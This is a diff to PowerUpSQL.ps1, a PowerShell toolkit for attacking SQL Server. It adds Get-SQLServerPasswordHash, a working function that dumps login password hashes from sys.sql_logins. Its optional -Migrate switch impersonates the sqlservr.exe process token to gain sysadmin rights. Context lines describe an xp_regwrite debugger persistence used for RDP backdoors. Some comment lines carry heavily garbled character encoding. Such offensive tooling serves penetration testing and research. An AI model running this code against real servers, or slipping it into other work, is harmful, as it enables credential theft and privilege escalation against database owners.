@@ -2,8 +2,8 @@
 <#
         File: PowerUpSQL.ps1
         Author: Scott Sutherland (@_nullbind), NetSPI - 2016
-        Contributors: Antti Rantasaari and Eric Gruber
-        Version: 1.0.0.65
+        Major Contributors: Antti Rantasaari and Eric Gruber
+        Version: 1.0.0.66
         Description: PowerUpSQL is a PowerShell toolkit for attacking SQL Server.
         License: BSD 3-Clause
         Required Dependencies: PowerShell v.2
@@ -8900,10 +8900,6 @@ Function Get-ComputerNameFromInstance
 }
 
 
-# -------------------------------------------
-# Function:  Get-SQLServiceLocal
-# -------------------------------------------
-# Author: Scott Sutherland
 Function  Get-SQLServiceLocal
 {
     <#
@@ -8951,7 +8947,10 @@ Function  Get-SQLServiceLocal
                 ValueFromPipeline = $true,
                 ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Filter for running services.')]
-        [switch]$RunOnly
+        [switch]$RunOnly,
+                [Parameter(Mandatory = $false,
+        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
+        [switch]$SuppressVerbose
     )
     Begin
     {
@@ -9037,7 +9036,10 @@ Function  Get-SQLServiceLocal
     {
         # Status User
         $LocalInstanceCount = $TblLocalInstances.rows.count
-        Write-Verbose "$LocalInstanceCount local SQL Server services were found that matched the criteria."        
+
+        if(-not $SuppressVerbose){
+            Write-Verbose "$LocalInstanceCount local SQL Server services were found that matched the criteria."        
+        }
 
         # Return data
         $TblLocalInstances 
@@ -11088,6 +11090,249 @@ Function   Get-SQLRecoverPwAutoLogon
          $TblWinAutoCreds 
     }
 }
+
+
+# ----------------------------------
+#  Get-SQLServerPasswordHash
+# ----------------------------------
+# Author: Mike Manzotti (@mmanzo_)
+Function  Get-SQLServerPasswordHash
+{
+    <#
+            .SYNOPSIS
+            Returns logins from target SQL Servers.
+            .PARAMETER Username
+            SQL Server or domain account to authenticate with.
+            .PARAMETER Password
+            SQL Server or domain account password to authenticate with.
+            .PARAMETER Credential
+            SQL Server credential.
+            .PARAMETER Instance
+            SQL Server instance to connection to.
+            .PARAMETER PrincipalName
+            Pincipal name to filter for.
+			.PARAMETER
+			Migrate to SQL Server process.
+            .EXAMPLE
+            PS C:\> Get-SQLServerPasswordHash -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 1
+
+			ComputerName        : SQLServer1
+			Instance            : SQLServer1\STANDARDDEV2014
+			PrincipalId         : 1
+			PrincipalName       : sa
+			PrincipalSid        : 7F883D1B...
+			PrincipalType       : SQL_LOGIN
+			CreateDate          : 19/03/2017 08:16:57
+			DefaultDatabaseName : master
+			PasswordHash        : 0x0200c8...
+            .EXAMPLE
+            PS C:\> Get-SQLInstanceLocal | Get-SQLServerPasswordHash -Verbose
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'SQL Server or domain account to authenticate with.')]
+        [string]$Username,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
+        [string]$Password,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Windows credentials.')]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'SQL Server instance to connection to.')]
+        [string]$Instance,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'Principal name to filter for.')]
+        [string]$PrincipalName,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Migrate to SQL Server process.')]
+        [switch]$Migrate,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
+        [switch]$SuppressVerbose
+    )
+
+    Begin
+    {
+        # Table for output
+        $TblPasswordHashes = New-Object -TypeName System.Data.DataTable
+        $null = $TblPasswordHashes.Columns.Add('ComputerName')
+        $null = $TblPasswordHashes.Columns.Add('Instance')
+        $null = $TblPasswordHashes.Columns.Add('PrincipalId')
+        $null = $TblPasswordHashes.Columns.Add('PrincipalName')
+        $null = $TblPasswordHashes.Columns.Add('PrincipalSid')
+        $null = $TblPasswordHashes.Columns.Add('PrincipalType')
+        $null = $TblPasswordHashes.Columns.Add('CreateDate')
+        $null = $TblPasswordHashes.Columns.Add('DefaultDatabaseName')
+        $null = $TblPasswordHashes.Columns.Add('PasswordHash')
+
+        # Setup CredentialName filter
+        if($PrincipalName)
+        {
+            $PrincipalNameFilter = " and name like '$PrincipalName'"
+        }
+        else
+        {
+            $PrincipalNameFilter = ''
+        }
+    }
+
+    Process
+    {
+        # Note: Tables queried by this function typically require sysadmin privileges.
+
+        # Parse computer name from the instance
+        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+
+        # Default connection to local default instance
+        if(-not $Instance)
+        {
+            $Instance = $env:COMPUTERNAME
+        }
+
+        # Test connection to instance
+        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
+            $_.Status -eq 'Accessible'
+        }
+
+        if($TestConnection)
+        {
+            if( -not $SuppressVerbose)
+            {
+                Write-Verbose -Message "$Instance : Connection Success."
+            }
+        }else{
+            if( -not $SuppressVerbose)
+            {
+                Write-Verbose -Message "$Instance : Connection Failed."
+            }
+
+            # If the migrate flag is set dont't return and attempt to migrate
+            if($Migrate)
+            {
+                Write-Verbose -Message "$Instance : Attempting to impersonate SQL Server process..." 
+                [int]$TargetPid = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceProcessId -ExpandProperty ServiceProcessId
+                if ($TargetPid -eq 0){
+                    Write-Verbose -Message "$Instance : No process running for provided instance..."
+                    return
+                }
+                Write-Verbose -Message "$Instance : Targeting process id $TargetPid..."
+                Get-Process | Where-Object {$_.id -like $TargetPid} | Invoke-TokenManipulation -Instance $Instance -ImpersonateUser  | Out-Null               
+            }else{            
+                return
+            }
+        }            
+
+        # Get sysadmin status
+        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
+
+        if($IsSysadmin -eq 'Yes')
+        {
+            Write-Verbose -Message "$Instance : You are a sysadmin."
+        }
+        else
+        {
+            Write-Verbose -Message "$Instance : You are not a sysadmin."
+            if($Migrate)
+            {
+                Write-Verbose -Message "$Instance : Attempting to impersonate SQL Server process..."
+                [int]$TargetPid = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceProcessId -ExpandProperty ServiceProcessId
+                Write-Verbose -Message "$Instance : Targeting process id $TargetPid..."                
+                Get-Process | Where-Object {$_.id -like $TargetPid} | Invoke-TokenManipulation -Instance $Instance -ImpersonateUser  | Out-Null
+            }
+        
+        }
+
+        # Check version
+        $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
+        if($SQLVersionFull)
+        {
+            $SQLVersionShort = $SQLVersionFull.Split('.')[0]
+        }
+
+        if([int]$SQLVersionShort -le 8)
+        {
+
+            # Define Query
+            $Query = "USE master;
+                SELECT '$ComputerName' as [ComputerName],'$Instance' as [Instance],
+                name as [PrincipalName],
+                createdate as [CreateDate],
+			    dbname as [DefaultDatabaseName],
+			    password as [PasswordHash]
+                FROM [sysxlogins]"
+        }
+		else
+        {
+            # Define Query
+            $Query = "USE master;
+                SELECT '$ComputerName' as [ComputerName],'$Instance' as [Instance],
+                name as [PrincipalName],
+			    principal_id as [PrincipalId],
+			    type_desc as [PrincipalType],
+                sid as [PrincipalSid],
+                create_date as [CreateDate],
+			    default_database_name as [DefaultDatabaseName],
+			    [sys].fn_varbintohexstr(password_hash) as [PasswordHash]
+                FROM [sys].[sql_logins]"
+        }
+
+        # Execute Query
+        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+
+        # Update sid formatting for each record
+        $TblResults |
+        ForEach-Object -Process {
+            # Format principal sid
+            $NewSid = [System.BitConverter]::ToString($_.PrincipalSid).Replace('-','')
+            if ($NewSid.length -le 10)
+            {
+                $Sid = [Convert]::ToInt32($NewSid,16)
+            }
+            else
+            {
+                $Sid = $NewSid
+            }
+
+            # Add results to table
+            $null = $TblPasswordHashes.Rows.Add(
+                [string]$_.ComputerName,
+                [string]$_.Instance,
+                [string]$_.PrincipalId,
+                [string]$_.PrincipalName,
+                $Sid,
+                [string]$_.PrincipalType,
+                $_.CreateDate,
+                [string]$_.DefaultDatabaseName,
+            [string]$_.PasswordHash)
+        }
+
+        # Revert to original user context
+        if($Migrate){            
+            Invoke-TokenManipulation -RevToSelf | Out-Null
+        }
+    }
+
+    End
+    {
+        # Return data
+        $TblPasswordHashes
+    }
+}
+
 #endregion
 
 #########################################################################
@@ -11301,7 +11546,7 @@ Function   Get-SQLPersistRegDebugger
             .SYNOPSIS
             This function uses xp_regwrite to configure a debugger for a provided 
             executable (utilman.exe by default), which will run another provided 
-            executable (cmd.exe by default) when itÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢s called. It is commonly used 
+            executable (cmd.exe by default) when itÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢s called. It is commonly used 
             to create RDP backdoors. The specific registry key is 
             HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options[EXE].  
             Sysadmin privileges are required.
@@ -15947,7 +16192,11 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
 
         [Parameter(ParameterSetName = "CreateProcess")]
         [Switch]
-        $PassThru
+        $PassThru,
+
+        [Parameter(Mandatory = $false,ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'SQL Server instance to connection to.')]
+        [string]$Instance
     )
    
     Set-StrictMode -Version 2
@@ -16837,7 +17086,11 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
             }
             else
             {
-                Write-Verbose "Successfully queried thread token"
+                if($Instance){
+                    Write-Verbose "$Instance : Successfully queried thread token"
+                }else{
+                    Write-Verbose "Successfully queried thread token"
+                }
             }
 
             #Close the handle to hThread (the thread handle)
@@ -17562,7 +17815,12 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
                     if (($Token | Get-Member ProcessId) -and $Token.ProcessId -eq $Process.Id)
                     {
                         $hToken = $Token.hToken
-                        Write-Verbose "Selecting token by Process object"
+
+                        if($Instance){
+                            Write-Verbose "$Instance : Selecting token by Process object"
+                        }else{
+                            Write-Verbose "Selecting token by Process object"
+                        }
                     }
                 }
 
@@ -17646,7 +17904,7 @@ function Test-IsLuhnValid
             .OUTPUTS
             System.Boolean
             .NOTES
-            Author: ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â¹Ãƒâ€¦Ã¢â‚¬Å“YVIND KALLSTAD
+            Author: ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¹ÃƒÆ’Ã¢â‚¬Â¦ÃƒÂ¢Ã¢â€šÂ¬Ã…â€œYVIND KALLSTAD
             Date: 19.02.2016
             Version: 1.0
             Dependencies: Get-LuhnCheckSum, ConvertTo-Digits
@@ -17681,7 +17939,7 @@ function Test-IsLuhnValid
 # -------------------------------------------
 # Function: ConvertTo-Digits
 # -------------------------------------------
-# Author: ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â¹Ãƒâ€¦Ã¢â‚¬Å“YVIND KALLSTAD
+# Author: ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¹ÃƒÆ’Ã¢â‚¬Â¦ÃƒÂ¢Ã¢â€šÂ¬Ã…â€œYVIND KALLSTAD
 # Source: https://communary.net/2016/02/19/the-luhn-algorithm/
 function ConvertTo-Digits
 {
@@ -17698,7 +17956,7 @@ function ConvertTo-Digits
             https://communary.wordpress.com/
             https://github.com/gravejester/Communary.ToolBox
             .NOTES
-            Author: ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â¹Ãƒâ€¦Ã¢â‚¬Å“YVIND KALLSTAD
+            Author: ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¹ÃƒÆ’Ã¢â‚¬Â¦ÃƒÂ¢Ã¢â€šÂ¬Ã…â€œYVIND KALLSTAD
             Date: 09.05.2015
             Version: 1.0
     #>
